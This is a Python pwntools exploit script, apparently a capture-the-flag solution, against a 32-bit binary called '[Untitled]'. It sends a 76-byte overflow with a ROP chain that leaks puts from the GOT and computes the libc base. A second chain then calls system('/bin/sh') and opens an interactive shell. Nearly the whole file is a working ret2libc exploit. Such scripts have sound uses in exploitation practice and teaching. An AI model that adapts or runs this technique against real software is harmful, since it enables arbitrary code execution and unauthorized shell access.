#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './[Untitled]')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

rop = ROP(exe)
rop.call(exe.plt['puts'], [exe.got['puts']])
rop.call(exe.symbols['execute_command'])  
offset = 76 
io.recvuntil(b"[Untitled] ~$ ")
payload = flat(
    b'A' * offset,
    rop.chain()
)
io.sendline(payload)
leak = io.recvline() 
leak = io.recvline()  
leaked_puts = u32(leak[:4].ljust(4, b'\x00'))
log.success(f"Leaked puts@libc: {hex(leaked_puts)}")
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

rop = ROP([exe, libc])
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
rop.call(libc.symbols['exit'], [0])
io.recvuntil(b"[Untitled] ~$ ")
payload = flat(
    b'A' * offset,
    rop.chain()
)
io.sendline(payload)

io.interactive()

